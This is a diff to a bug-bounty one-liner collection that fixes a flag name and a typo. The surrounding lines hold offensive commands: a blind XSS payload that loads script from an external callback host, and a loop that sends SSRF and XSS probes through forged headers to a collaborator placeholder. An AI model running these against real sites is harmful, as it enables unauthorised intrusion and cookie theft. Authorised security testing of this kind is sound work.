@@ -52,7 +52,7 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 ## BXSS - Bling XSS in Parameters
 > [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
 ```bash
-subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameter
+subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
 ```
 
 ## Blind XSS In X-Forwarded-For Header
@@ -180,7 +180,7 @@ edited **if we don't have chaos api_key**
 cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
 ```
 
-## Check Blind ssrf in Header,Path,Host & check xss via web cache poisning.
+## Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
 > @sratarun
 ```bash
 cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
